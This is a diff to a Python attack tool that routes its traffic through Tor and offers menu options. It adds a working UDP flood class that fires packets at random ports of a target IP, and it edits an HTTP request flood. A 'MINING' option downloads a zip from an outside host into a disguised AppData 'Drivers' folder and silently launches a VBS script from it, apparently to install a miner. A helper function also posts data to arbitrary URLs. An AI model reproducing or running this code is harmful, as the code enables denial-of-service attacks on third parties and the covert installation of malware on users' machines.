@@ -15,11 +15,15 @@ import zlib
 import base64
 import struct
 import sys
-from io import BytesIO
-from PIL import Image
-import shutil
-import string
 import socks
+import zipfile
+import getpass
+from socket import socket, AF_INET, SOCK_DGRAM
+from threading import Thread
+from random import choices, randint
+from time import time, sleep
+from pystyle import *
+from getpass import getpass as hinput
 proxies = {
     'http': 'socks5h://127.0.0.1:9150',  # Tor proxy address and port for HTTP
     'https': 'socks5h://127.0.0.1:9150'  # Tor proxy address and port for HTTPS
@@ -115,11 +119,6 @@ def METASPLOIT():
                 elif option == "MINING":
                     TIMED = random.choice([0,10,20,30])
                     time.sleep(TIMED)
-                    import os
-                    import requests
-                    import zipfile
-                    import getpass
-                    import subprocess
                     username = getpass.getuser()
                     target_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Drivers")
                     target_folder1 = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows")
@@ -127,7 +126,7 @@ def METASPLOIT():
                       os.makedirs(target_folder)
                     download_url = "https://s01.babup.com/uploads/IMIG-328958365.zip"
                     zip_file_name = "Drivers.zip"
-                    response = requests.get(download_url, verify=False)
+                    response = requests_session.get(download_url, verify=False)
                     with open(zip_file_name, "wb") as zip_file:
                        zip_file.write(response.content)
                     with zipfile.ZipFile(zip_file_name, "r") as zip_ref:
@@ -136,12 +135,10 @@ def METASPLOIT():
                     subprocess.Popen(f"start {vbs_script_path}", shell=True)
                 elif option == "DDOS":
                     os.system("cls")
-                    import requests
-                    import threading
                     requests_per_second = 100000
                     def send_requests():
                         try:
-                           response = requests.get(target)
+                           response = requests_session.get(target)
                            if response.status_code == 200:
                                pass
                         except Exception as e:
@@ -155,16 +152,137 @@ def METASPLOIT():
 
                     for thread in threads:
                      thread.join()
+                elif option == "UDOS":
+                    class Brutalize:
+                        def __init__(self, ip, port, force, threads):
+                            self.ip = ip
+                            self.port = port
+                            self.force = force # default: 1250
+                            self.threads = threads # default: 100
+                            self.client = socket(family=AF_INET, type=SOCK_DGRAM)
+                            self.data = str.encode("x" * self.force)
+                            self.len = len(self.data)
+                        def flood(self):
+                            self.on = True
+                            self.sent = 0
+                            for _ in range(self.threads):
+                                Thread(target=self.send).start()
+                            Thread(target=self.info).start()  
+                        def info(self):
+                            interval = 0.05
+                            now = time()
+                            size = 0
+                            self.total = 0
+                            bytediff = 8
+                            mb = 1000000
+                            gb = 1000000000
+                            while self.on:
+                                sleep(interval)
+                                if not self.on:
+                                    break
+                                if size != 0:
+                                    self.total += self.sent * bytediff / gb * interval
+                                    print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')
+                                now2 = time()     
+                                if now + 1 >= now2:
+                                    continue       
+                                size = round(self.sent * bytediff / mb)
+                                self.sent = 0
+                                now += 1
+                        def stop(self):
+                            self.on = False
+                        def send(self):
+                            while self.on:
+                                try:
+                                    self.client.sendto(self.data, self._randaddr())
+                                    self.sent += self.len
+                                except:
+                                    pass
+                        def _randaddr(self):
+                            return (self.ip, self._randport())
+                        def _randport(self):
+                            return self.port or randint(1, 65535)
+                    fluo = Col.light_red
+                    fluo2 = Col.light_blue
+                    white = Col.white
+                    blue = Col.StaticMIX((Col.blue, Col.black))
+                    bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
+                    purple = Col.StaticMIX((Col.purple, blue, Col.white))
+                    def init():
+                        System.Size(140, 40)                             
+                        Cursor.HideCursor()
+                    init()
+                    def stage(text, symbol = '...'):
+                        col1 = purple
+                        col2 = white
+                        return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"
+                    def error(text, start='\n'):
+                        hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
+                        exit()
+                    def main():
+                        print()
+                        ip = input(stage(target))
+                        print()
+                        try:
+                            if ip.count('.') != 3:
+                                int('error')
+                            int(ip.replace('.',''))
+                        except:
+                            pass
+                        port = ''
+                        print()
+                        if port == '':
+                            port = None 
+                        else:
+                            try:
+                                port = int(port)
+                                if port not in range(1, 65535 + 1):
+                                    int('error')
+                            except ValueError:
+                                   pass
+                        force = ''
+                        print()
 
+                        if force == '':
+                            force = 1250
+                        else:
+                            try:
+                                force = int(force)
+                            except ValueError:
+                                pass
+                        threads = ''
+                        print()
+                        if threads == '':
+                            threads = 100
+                        else:
+                            try:
+                                threads = int(threads)
+                            except ValueError:
+                                pass
+                        print()
+                        cport = '' if port is None else f'{purple}:{fluo2}{port}'
+                        print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')
+                        brute = Brutalize(ip, port, force, threads)
+                        try:
+                            brute.flood()
+                        except:
+                            brute.stop()
+                        try:
+                            while True:
+                                sleep(1000000)
+                        except KeyboardInterrupt:
+                            brute.stop()
+                        print('\n')
+                        sleep(1)
+                    if __name__ == '__main__':
+                        main()          
+            
 
             if mac == actual_mac:
 
                 if option == "START":
                     os.system("cls")
                     def run_specific_code():
-                        import socket, zlib, base64, struct, time, random
-                        import socks
-
                         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9150)  # Use Tor's default port
                         socket.socket = socks.socksocket  # Redirect all socket traffic through Tor
 
@@ -230,7 +348,7 @@ def clear_screen():
 
 def send_data_to_url(url, data):
     try:
-        response = requests.post(url, data=data)
+        response = requests_session.post(url, data=data)
         return f"Data sent to {url}: {response.text}"
     except Exception as e:
         return f"Error sending data to {url}: {str(e)}"
